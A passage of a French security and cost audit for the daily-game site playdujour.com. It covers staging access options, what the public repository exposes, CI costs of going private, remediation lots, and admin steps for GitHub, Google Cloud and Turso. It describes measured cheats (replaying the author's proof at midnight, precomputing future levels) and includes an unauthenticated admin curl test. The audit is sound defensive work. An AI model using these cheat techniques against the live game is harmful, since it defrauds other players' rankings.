**Fait dans ce lot** : `robots.txt` « tout interdit » et `X-Robots-Tag: noindex, nofollow, noarchive` sur tout le site de recette et les aperçus (`scripts/site.mjs`, `deploy-site.yml`, testés) ; `robots.txt` permissif en production ; limites de débit identiques à la production (aucune différence dans le code ; testé par le plan commun).

**Options pour une vraie porte d'entrée** (lot « Porte de la recette ») :

| | 1. Clé de recette saisie une fois | 2. Identité Google (IAP / invoker) | 3. Retirer `recette.playdujour.com`, garder `web.app` |
|---|---|---|---|
| Fonctionnement | Une page d'entrée demande une clé (gardée dans le navigateur) ; la clé part en en-tête à chaque appel ; l'API de recette refuse sans elle (`401`) ; les cartes à venir (jours figés d'avance, outils de date) ne sont servies que par l'API avec la clé | IAP sur un équilibreur devant le site et l'API, ou `roles/run.invoker` réservé à Nathan | Plus de nom de domaine pour la recette ; l'adresse `web.app` reste devinable mais n'est plus affichée nulle part |
| Protection réelle | Bonne pour l'API et pour les données ; **ne cache pas le code du site** (il est dans `main`, public) | Forte (identité Google) | Faible (obscurité) |
| Coût | 0 $ | IAP + équilibreur ≈ 18 $/mois (+ certificats) ; « invoker » seul 0 $ mais **Firebase Hosting ne sait pas appeler un Cloud Run privé** (R5 § 2) | 0 $ |
| Effort | M (1 jour : `deploy-api.yml`, un en-tête, une page d'entrée) | L (3 jours, casse les aperçus Firebase) | S (1 heure) |
| Pour Nathan au téléphone | Saisit la clé **une fois** par appareil (puis elle reste) ; les aperçus de PR : même clé, une fois par origine (chaque aperçu est une origine distincte) | Connexion Google à chaque appareil ; les aperçus de PR ne marchent plus par lien simple | Ouvre l'adresse `web.app` enregistrée en favori |

Recommandation : **option 1** (clé de recette), en gardant à l'esprit la remarque de Nathan : **tant que le dépôt est public, le code des jours à venir y est lisible** ; la protection de la recette ne cache donc rien d'autre que les données et l'API, et va de pair avec le passage en privé (§ 7).

**Commande à copier pour le scénario de test** (action d'administration sans jeton, sur l'aperçu de cette PR, lien commenté par le workflow « Recette ») :

```
curl -i -X PUT "<adresse de l'aperçu>/api/admin/planning/2026-12-01" -H "Content-Type: application/json" -d '{"variant":1}'
```
Attendu : `HTTP/2 401` et `{"error":"unauthorized"}` ; avec `?token=n'importe-quoi` dans l'adresse, toujours 401 ; la 429 arrive après 10 essais de suite.

## 6. Le dépôt public : ce qu'il expose

Faits tirés du dépôt (audit de l'exposition ; commandes reproductibles à la fin du rapport).

| Ce qu'on y lit | Gravité | Ce qu'un joueur en tire | Traitement |
|---|---|---|---|
| **`apps/jump/public/demo/` et `apps/web/public/demo/`**, servis par la production : pour Jump les jours 27 à 30/10, pour Track le 26/10, avec la **rediffusion parfaite du premier** (identique à la preuve de l'auteur du jour) | élevée | envoyer la preuve à minuit pile et prendre le rang 1 (mesuré : acceptée par le serveur le jour J, médaille `author`) | **retirés de la production** (S-03) |
| Niveaux figés de Jump `apps/jump/public/levels/2026-10-16…26.json` : le niveau **complet et la preuve de l'auteur** ; le 26/10 est servi par `playdujour.com/jump/levels/2026-10-26.json` **la veille** (200, 6 665 octets) alors que `GET /api/jump/day/2026-10-26` répond 404 | moyenne | s'entraîner sur le vrai niveau 1 jour avant ; envoyer la preuve à minuit | S-08, lot « Ne pas publier demain » |
| Générateur et graine : `DAILY_SALT` constante (« jour »), `seed = mixSeed(jour, sel)`, version dans l'identifiant ; Track `Rng(mixSeed(jour, tentative+1+variante×1000))`, thème par la date | moyenne (par conception) | **calculer les cartes futures** : recalculé avec le code de production le 15/11 (Jump `jour-2026-11-15-g12`, Track `…-g16`), preuve acceptée le jour J, refusée la veille (409 / 404) | graine secrète du jour (lot) ; limite connue (`access.ts`, lot 31) |
| Dates de bascule du générateur et des médailles (`packages/sim/src/dailyId.ts` : 28/10, 4/11), feuille de route dans `docs/` | faible | savoir quel générateur jouera quel jour | information |
| Simulation, pilote de Track, catalogue de solutions de Jump, solveur hors ligne (`packages/jump-sim/tools/`), options d'adresse de debug | moyenne | tricher plus facilement (§ S-16) | cacher le dépôt ne l'empêche pas : le navigateur reçoit déjà générateur, physique et catalogue (JS minifié, sans source maps) ; un tricheur motivé obtient les mêmes capacités en quelques heures |
| Documentation de la chaîne : projet Google `dailytrack-511513`, comptes `cdj-deploy@…`, hôtes Turso (`ci.yml`, `recette.test.ts`), noms de secrets | faible | cartographie pour un attaquant | identifiants, pas des accès ; rien à changer, à savoir |
| **Pas de secret** (jetons, clés, mots de passe) dans l'arbre ni dans l'historique complet | — | — | gitleaks : 2 faux positifs (jetons de test de `planning.test.ts` et du README du lot 14) |

**Ce qui ne pose pas de problème** : le code des jeux, de la simulation et du serveur ; la liste des routes ; l'e-mail de contact (voulu, dans les mentions) ; les noms de service ; les jetons de test (`playwright.config.ts`, `ci.yml` — vérifier que les vrais ne leur ressemblent pas).

**Honnêteté sur le dépôt privé** : cacher le dépôt retire la lecture facile du code, des `docs/` et du solveur, mais **pas** l'avantage structurel (le générateur est livré au navigateur). Ce qui protège vraiment : une graine secrète révélée à minuit, ne pas publier les fichiers de demain, et des contrôles de plausibilité.

## 7. Le dépôt privé : ce que cela coûterait

### 7.1 Minutes de CI mesurées

`gh api` sur `repos/Nathan-Te/DailyTrack/actions/runs` (2 149 runs depuis la création du dépôt le **06/10/2026** : **19,4 jours de données, pas 30**) puis les jobs de chaque run (2 145 runs lus, `filter=all`) ; durée de chaque job = `completed_at − started_at`, **arrondie à la minute supérieure** (« GitHub rounds the minutes and partial minutes each job uses up to the nearest whole minute », <https://docs.github.com/en/billing/reference/actions-minute-multipliers>, consultée le 25/10/2026), coefficient 1 (tous les jobs sont sur `ubuntu-latest`). Un job annulé dont la durée dépasse 2 h (horodatage de file d'attente) est compté 0 ; les jobs sautés aussi. Les anciens workflows retirés (« Pages », « pages build and deployment », « Preview ») sont comptés à part (≈ 1 400 min). L'API `…/timing` rend 0 sur un dépôt public (non utilisable).

| Mesure | Valeur |
|---|---|
| Minutes facturables sur la période (19,4 j) | **55 481** (49 194 de calcul brut : l'arrondi par job ajoute ≈ 17 %) |
| Moyenne par jour | ≈ 2 860 |
| **Dernière semaine (19 → 25/10)** | **34 873** (29 651 brutes) |
| Projection mensuelle, moyenne de la période | **≈ 86 000 min** |
| Projection mensuelle, rythme de la dernière semaine | **≈ 150 000 min** |
| **Par PR** (106 branches) | moyenne **283 min**, médiane **193** ; la dernière semaine **400** (10,2 runs de CI par PR : poussées successives, `[ci complet]`, fusion de `main`) |
| Un run de CI de PR (188 la dernière semaine) | 106 min en moyenne (durée murale médiane 11,8 min, p90 23,1) |
| **Par fusion** (63 la dernière semaine) | CI complète sur `main` **142 min** + recette 10 min ≈ **152 min** |
| **Par mise en production** (7 runs) | **13 min** (`Mettre en production`), hors CI complète du commit |
| Run de nuit (03 h 17 UTC) | 138 min × 30 ≈ **4 100 min/mois** |
| Poids des jobs | 8 parts Chromium de DailyTrack ≈ 55 % ; unitaires ≈ 3 % ; aperçu + recette ≈ 7 % |

Réserves : la période est celle du lancement et d'un développement intense par des agents (10 runs de CI par PR) ; le rythme baissera, mais pas jusqu'à rentrer dans 3 000 minutes. Un régime sobre (≈ 20 PR × 3 runs × 60 min + 25 fusions × 140 min + 30 nuits × 125 min) resterait autour de **11 000 min/mois**. Les artefacts (rapports et traces de 14 jours) et le cache (10 Go par dépôt) consomment aussi du stockage facturé au-delà de 500 Mo (Free) / 1 Go (Pro).

### 7.2 Offres et prix cités (pages consultées le 25/10/2026)

- **Minutes incluses (dépôt privé)** : GitHub Free 2 000 min/mois et 500 Mo ; GitHub Pro 3 000 min et 1 Go ; Team 3 000 min et 2 Go ; Enterprise Cloud 50 000 min (<https://docs.github.com/en/billing/managing-billing-for-your-products/managing-billing-for-github-actions/about-billing-for-github-actions>).
- **Au-delà** : Linux 2 cœurs **0,006 $/min** (même page). Exécuteurs hébergés standards **gratuits en dépôt public** ; exécuteurs **auto-hébergés gratuits** (<https://docs.github.com/en/actions/concepts/billing-and-usage>). Plafond de dépenses par défaut à 0 $ : une fois les minutes épuisées, **les jobs s'arrêtent**.
- **Prix des offres** : la page <https://github.com/pricing> (25/10/2026) affiche Free 0 $, Team 4 $ par utilisateur et par mois pendant 12 mois puis tarif normal, Enterprise 21 $ ; elle ne montre pas de ligne « Pro » : **le prix de GitHub Pro n'a pas pu être relu ici** (les pages de documentation qui le citent ne donnent pas de prix) — à vérifier sur la page de facturation de Nathan.

### 7.3 Fonctions perdues ou payantes en privé

| Fonction | Public (aujourd'hui) | Privé + Free | Privé + Pro | Privé + Team | Ce que `production.yml` utilise |
|---|---|---|---|---|---|
| Protection de branche / statuts requis `test`, `e2e` | oui | **non** (limitée aux dépôts publics) | oui | oui | statuts de `main` |
| Environnements | oui | **non** | oui | oui | `environment: production` (serveur), `recette` |
| **Relecteurs requis d'un environnement** (la validation de « Mettre en production ») | oui | **non** | **non** | **non** | **oui — la validation de Nathan** ; page <https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments> : « required reviewers are only available for public repositories » (Free, Pro, Team) ; Enterprise Cloud requis |
| Branches/étiquettes autorisées d'un environnement | oui | non | oui | oui | — |
| Secret scanning + push protection | gratuit, automatique | non | non | achat « Secret Protection » (Team/Enterprise seulement) | — |
| Code scanning (CodeQL) | gratuit | non | non | achat « Code Security » | — |
| Dependabot (alertes) | oui | oui | oui | oui | — |
| GitHub Pages | oui | non | non (privé : Enterprise Cloud) | non | déjà retiré (R5), **mais `has_pages` est encore vrai** (§ 9.1) |

**Ce qu'il faudrait changer** dans « Mettre en production » (**non fait ici**, hors périmètre — lot R6) : remplacer la validation de l'environnement (inexistante en privé hors Enterprise) par **une saisie de confirmation** (entrée `confirmer: "OUI"` + l'étiquette prévue), l'environnement `production` limité à `main` (disponible en Pro) et la condition de la fédération Google liée à cet environnement (S-07) : le « clic de validation » devient le lancement manuel lui-même, réservé à qui a le droit d'écrire.

### 7.4 Tableau « Dépôt privé : coût par option »

| Option | Coût mensuel estimé | Minutes GitHub | Fonctions | Risques et remarques |
|---|---|---|---|---|
| **A. Rester public** | **0 $** (CI gratuite) | illimitées | tout (secret scanning, push protection, CodeQL, environnements à relecteurs) | exposition du § 6 ; corrigée pour l'essentiel ; le reste vient de l'architecture, pas du dépôt |
| **B. Privé + Free** | 0 $ d'abonnement ; **la CI s'arrête après 2 000 min, soit ≈ 15 heures de travail au rythme actuel** ; pour la poursuivre : ≈ 500 à 880 $/mois (86 000 à 150 000 min) | 2 000 | pas de protection de branche, pas d'environnement, ni scanning ; **non viable** pour le flux actuel | à éviter |
| **C. Privé + Pro** | abonnement Pro (prix à relire) + 0,006 $/min au-delà de 3 000 : **≈ 500 à 880 $/mois au rythme actuel** ; ≈ **50 $/mois** au régime sobre (11 000 min) | 3 000 | protection de branche, environnements (branches autorisées) ; **pas de relecteurs requis** ; pas de scanning | la CI complète à trois navigateurs n'est pas tenable sans la réduire |
| **D. Privé + exécuteurs auto-hébergés** (serveur Debian de Nathan) | abonnement Pro (protection de branche) + électricité ; minutes GitHub ≈ 0 pour les jobs auto-hébergés ; garder sur GitHub les jobs qui touchent à Google (déploiements : ≈ 25 min par mise en production, ≈ 2 500 min/mois de recette et d'aperçus au rythme actuel → **dans les 3 000 de Pro**) | ≈ 0 + déploiements | comme C | voir ci-dessous : charge, isolation, code d'agents exécuté chez Nathan |

**Option D — ce qu'il faut** : la charge actuelle est ≈ 580 heures-exécuteur à 2 cœurs par semaine (34 873 min), soit **3,5 machines à 2 cœurs occupées en permanence** ; un serveur de 8 à 16 cœurs, 16 à 32 Go, 100 Go de disque suffit pour un régime sobre ; à installer : le service d'exécuteur de GitHub (`actions/runner`) **en mode éphémère** (un conteneur ou une machine virtuelle neuve par job, jamais le même environnement deux fois), Docker ou Podman, Node 22, les navigateurs de Playwright (Chromium, Firefox, WebKit et leurs dépendances système sous Debian). **Isolation** : utilisateur sans droits, pas de `sudo`, aucun accès au réseau local de Nathan (VLAN ou règles de pare-feu sortantes), aucun secret sur l'hôte, disque jetable. **Risque principal** : le code des PR — dont celui des sessions d'agents — s'exécute chez Nathan ; une consigne injectée dans un agent peut produire un workflow malveillant. À écarter : exécuteurs auto-hébergés sur un dépôt **public** (jamais). Ce qui reste sur GitHub : tous les jobs qui reçoivent `id-token: write` ou un secret.

### 7.5 Recommandation (la décision est à Nathan)

**Rester public pour l'instant (option A)**, pour trois raisons chiffrées : (1) le privé coûte ≈ 500 à 900 $/mois au rythme actuel, ou un chantier d'exécuteurs auto-hébergés avec du code d'agents exécuté chez lui ; (2) il fait perdre la validation de « Mettre en production » sans l'offre Enterprise (21 $ par utilisateur et par mois affichés, minutes incluses 50 000) ; (3) il ne rend pas les niveaux futurs imprévisibles — ce que corrigent la graine secrète et la non-publication des fichiers de demain, qui se font aussi en public. Les failles réellement exploitables trouvées (S-01 à S-06) sont corrigées dans ce lot.

**Si Nathan veut quand même le privé** (par exemple pour protéger la recette) : Pro + exécuteurs auto-hébergés pour les gros jobs (D) + CI de PR allégée + confirmation saisie au lieu de la validation. **Ordre des étapes** :
1. avant tout : corriger ce qui est dans ce lot, fusionner, mettre en production ;
2. désactiver GitHub Pages et supprimer la branche `gh-pages` (§ 9.1) ;
3. mettre en place la clé de recette et la fédération Google limitée à l'environnement (S-07) — **avant** de passer en privé ;
4. installer les exécuteurs auto-hébergés et basculer les jobs lourds (`runs-on`) ; mesurer une semaine ;
5. remplacer la validation de l'environnement par la confirmation saisie (lot R6) ;
6. passer en privé (Settings → Danger zone → Change visibility) ; recréer la protection de `main` (non requise sur Pro mais à vérifier) ; remettre les secrets/variables en place (conservés) ;
7. **ce qui casse** : GitHub Pages (déjà retiré, à désactiver) ; les liens publics vers le dépôt ou ses fichiers (`README`, documentation : aucun lien `raw.githubusercontent.com` ni badge trouvé dans le dépôt) ; l'ancienne origine `nathan-te.github.io` (retirée des origines en R5) ; les artefacts de CI ne sont plus lisibles sans compte ; les aperçus de PR (Firebase, pas GitHub) et la production **ne changent pas** ; les anciennes copies publiques (forks, archives, moteurs de recherche) restent : **rien de ce qui a été public ne se reprend** (d'où l'absence de secret à révoquer, constatée en § 1).

## 8. Lots proposés

| Réf. | Titre | Zone | Taille | Priorité |
|---|---|---|---|---|
| L-CSP | **CSP stricte** et en-têtes complets de Hosting (politique testée dans Chromium ci-dessous ; Firefox et WebKit à tester ; aperçus à adresse directe : `connect-src` généré par `site.mjs`) | `firebase.json`, `scripts/site.mjs`, `apps/web` (admin : feuille de style externe) | S–M | haute |
| L-ADM | **Administration hors du site public** (service Cloud Run d'administration séparé derrière l'identité Google ; jeton hors du navigateur) | `apps/web/admin`, `deploy-api.yml`, `apps/api` | M | haute |
| L-REC | **Porte de la recette** : clé de recette en en-tête, cartes à venir servies par l'API avec la clé, page d'entrée | `apps/api`, `apps/web`, `apps/jump`, `apps/portail`, workflows | M | haute |
| L-DEP | **Séparer recette et production** : second compte de déploiement lié à l'environnement `production` sur `main` ; rôles au niveau des ressources ; à terme second projet Google pour la recette | consoles Google, `deploy-*.yml`, `production.yml` (avec le lot R6) | M–L | haute |
| L-FUT | **Ne pas publier demain** : niveau figé de demain gardé par le serveur et servi à partir de J ; PR « robot » après J ; `?solution` à décider | `apps/jump`, `apps/api`, `production.yml` | M | moyenne |
| L-GRN | **Graine secrète du jour** : sel quotidien `HMAC(secret, jour)` révélé par l'API à minuit de Paris (404 avant) ; jours passés régénérables ; golden et tests à adapter | `packages/*-sim`, `apps/*`, `apps/api` | L | moyenne (décision de Nathan) |
| L-RJ | **Rejeu borné** : arrêt d'une voiture sans progrès, plafond de pas à 3–5 min, rejeu en `worker_thread` avec délai | `packages/sim`, `packages/jump-sim`, `apps/api` | M | moyenne |
| L-LEC | **Lectures et cache** : cache mémoire du classement et de son décompte, `Cache-Control` court | `apps/api` | S | moyenne |
| L-ID | **Identifiants hachés** en base (HMAC) avec migration | `apps/api` | M | moyenne |
| L-ENT | **Entrée unique** : couper l'accès direct à `run.app` (fin de S-13) | consoles Google, `firebase.json` | M | moyenne |
| L-CPT | **Comptes en masse** : plafond de créations, agrégation SQL de la carte des morts | `apps/api` | M | moyenne |
| L-ROB | **Plausibilité des entrées** (signalement, déduplication, indicateurs dans l'administration) | `apps/api`, `packages/*-sim` | M | moyenne |
| L-SEM | `?semaine=` et `outils/` réservés aux constructions hors production (avant la mise en production du lot 19 de Jump) | `apps/jump` | S | **avant** la prochaine mise en production |
| L-T32 | DailyTrack sans `?player=` (retouche 32b : 400 sur l'ancien paramètre) | `apps/web`, `apps/api` | S | déjà prévu |
| L-PSD | Pseudos : confusables (UTS #39), variantes | `apps/api` | S | faible |
| L-DEV | Dépendances de développement (`wrangler` — Cloudflare, non utilisé — tire `miniflare`/`undici`/`sharp` : 4 alertes hautes en développement) : retirer `wrangler` ; Dependabot ; Docker épinglé par empreinte ; `npm ci --ignore-scripts` dans les jobs de déploiement | racine, `apps/api`, workflows | S | faible |

## 9. Étapes manuelles pour Nathan

Rien ci-dessous ne casse le site ; chaque étape dit ce que tu dois voir.

### 9.1 GitHub (Settings du dépôt)
1. **Pages** : Settings → Pages. Le dépôt répond encore « Pages activées » (`has_pages: true`) et une branche `gh-pages` existe. **Tu dois voir** un bandeau « Your site is live » ; clique **Unpublish site** (ou source **None**), puis supprime la branche `gh-pages` (Code → Branches).
2. **Actions** : Settings → Actions → General → *Fork pull request workflows from outside collaborators* : choisis **Require approval for all outside collaborators** ; *Workflow permissions* : **Read repository contents and packages permissions** (cocher *Allow GitHub Actions to create and approve pull requests* seulement si `ROBOT_TOKEN` n'est pas utilisé).
3. **Sécurité** : Settings → Code security → active **Dependabot alerts**, **Dependabot security updates**, **Secret scanning** et **Push protection** (gratuits en public). **Tu dois voir** quatre interrupteurs « Enabled ».
4. **Dependabot des actions** : crée `.github/dependabot.yml` avec l'écosystème `github-actions` (hebdomadaire) pour que les empreintes épinglées soient mises à jour par PR (je ne l'ai pas ajouté : c'est une zone du lot « Chaîne de livraison »).
5. **Environnement `production`** : Settings → Environments → production → *Required reviewers* : toi ; *Deployment branches and tags* : **Selected branches** → `main`. Même chose pour `recette` (branches : toutes) si elle existe.
6. **Protection de `main`** : Settings → Branches (ou Rulesets) → statuts requis `test` et `e2e`, *Require a pull request before merging*, *Do not allow bypassing* (je n'ai pas pu lire cette configuration : **à vérifier**).
7. **Jeton de robot** : Settings → Developer settings → Fine-grained tokens → `ROBOT_TOKEN` : dépôt `Nathan-Te/DailyTrack` seulement, permissions *Contents* et *Pull requests* en écriture, **expiration 90 jours** ; note la date de renouvellement.
8. **Licence** : le dépôt n'a pas de licence (droits réservés par défaut) ; décide si tu veux en ajouter une (c'est un choix, pas une faille).

### 9.2 Google Cloud (console ou Cloud Shell, projet `dailytrack-511513`)
1. **Lire la condition de la fédération** (aucun risque) :
   `gcloud iam workload-identity-pools providers describe github-repo --location=global --workload-identity-pool=github --format='value(attributeCondition)'`
   **Tu dois voir** `assertion.repository=='Nathan-Te/DailyTrack'`. Ajoute l'identifiant du dépôt (1407318739, public) pour qu'un dépôt recréé sous le même nom ne passe pas :
   `gcloud iam workload-identity-pools providers update-oidc github-repo --location=global --workload-identity-pool=github --attribute-condition="assertion.repository=='Nathan-Te/DailyTrack' && assertion.repository_id=='1407318739'"`
   Relance ensuite « Recette » (Actions → Run workflow) : elle doit rester verte.
2. **Rôles de `cdj-deploy`** : `gcloud projects get-iam-policy dailytrack-511513 --flatten=bindings --filter="bindings.members:cdj-deploy@dailytrack-511513.iam.gserviceaccount.com" --format='value(bindings.role)'` — **tu dois voir** `roles/run.admin`, `roles/artifactregistry.writer`, `roles/firebasehosting.admin`, `roles/serviceusage.serviceUsageConsumer` (voir S-07 : c'est ce que le lot L-DEP réduira).
3. **Clé de compte de service** : GitHub → Settings → Secrets and variables → Actions : si **`GCP_SA_KEY`** est présent, supprime-le (la fédération suffit) ; côté Google : IAM → Comptes de service → `cdj-deploy` → Clés : **aucune clé** ne doit être listée.
4. **Jeton d'administration** : vérifie sa longueur sans l'afficher : `gcloud secrets versions access latest --secret=cdj-admin-token | wc -c` — **tu dois voir** 32 ou plus (le journal de démarrage du serveur le dira aussi : « ADMIN_TOKEN de moins de 32 caractères »). Pour le changer : `openssl rand -hex 24 | tr -d '\n' | gcloud secrets versions add cdj-admin-token --data-file=-`, relancer le déploiement, mettre le nouveau jeton dans ton gestionnaire de mots de passe.
5. **Journaux** : Journalisation → Explorateur de journaux → filtre `jsonPayload.message="admin : jeton refusé"` : après cette PR, chaque jeton refusé y apparaît (sans adresse ni jeton) ; crée une alerte si plus de 5 en 10 minutes (facultatif).
6. **Budget** : Facturation → Budgets et alertes → crée un budget mensuel (par exemple 25 €) avec alertes à 50 / 90 / 100 % : c'est ton garde-fou si quelqu'un martèle le site ou la recette.

### 9.3 Turso
1. Console Turso (ou `turso db list`) : pour chacune des deux bases (production, recette), **Generate token** → Read & Write, **expiration 90 jours** ; mets-le dans Secret Manager (`gcloud secrets versions add cdj-turso-token --data-file=-`, et `cdj-recette-turso-token`), relance le déploiement ; **puis** `turso db tokens invalidate <base>` (invalide les anciens jetons, y compris celui « sans expiration » de la mise en ligne). **Tu dois voir** `/api/health` répondre `db: ok` après le redéploiement.
2. Vérifie la région des bases (`turso db show <base>`) : la page des mentions s'en sert (décision de R5 restée ouverte).

## 10. Commandes pour refaire l'audit

- Historique : `go install github.com/zricethezav/gitleaks/v8@latest` (dans un dossier temporaire) puis `gitleaks git --redact=100 --log-opts="--all" .` (dépôt complet : `git fetch --unshallow` d'abord).
- Dépendances : `npm audit` (4 alertes hautes **en développement** — `wrangler → miniflare → undici`/`sharp` — aucune en production : `npm audit --omit=dev` donne 0) ; `npm ls --omit=dev`.
- Workflows : `node scripts/securite-workflows.mjs`.
- Minutes de CI : voir les paramètres du § 7.1 (`gh api repos/Nathan-Te/DailyTrack/actions/runs?created=<jour>..<jour>` puis `…/runs/<id>/jobs?filter=all`).
- Coût de rejeu : `apps/api/test/auditR7.test.ts` ; mesures brutes de l'audit conservées dans le dossier de session.
- Niveaux futurs : `packages/jump-sim` `dailyLevel(<jour>)` et `packages/sim` `dailyCircuit(<jour>)` avec le code de l'étiquette `prod-…` ; `curl -s -o /dev/null -w '%{http_code}' https://playdujour.com/jump/levels/<jour>.json`.

## Annexe — politique CSP et en-têtes testés

Politique essayée par l'audit du client (Chromium 153, site de production assemblé servi par un faux Hosting ; **zéro violation** et jeu démarré sur le portail, classement, profil, mentions FR/EN, 404, Track (accueil, archives avec miniatures `blob:`, garage, réglages, tactile), Salon en démo, Jump (FR, accueil, tactile), les deux `verify.html`) :

```
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; worker-src 'self'; manifest-src 'self'; base-uri 'none'; form-action 'none'; object-src 'none'; frame-ancestors 'none'
```
Pour `/track/admin/**` seulement : `style-src 'self' 'unsafe-inline'` (la page a un `<style>` en ligne ; le lot L-CSP la passe en feuille externe). Avec cette politique, l'exfiltration par `?api=` est bloquée même sans le correctif du code (ceinture). **Non testé** : Firefox, WebKit, les aperçus à adresse directe de révision (`connect-src` devrait contenir l'origine de la révision), l'ordre de priorité de deux entrées `headers` de même clé dans `firebase.json`, HSTS/COOP réels de Hosting. Ce lot n'active que la partie sans risque : `frame-ancestors 'none'; base-uri 'self'; object-src 'none'; form-action 'self'`, `X-Content-Type-Options`, `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy` (caméra, micro, géolocalisation, paiement, USB, Bluetooth, série, HID retirés).
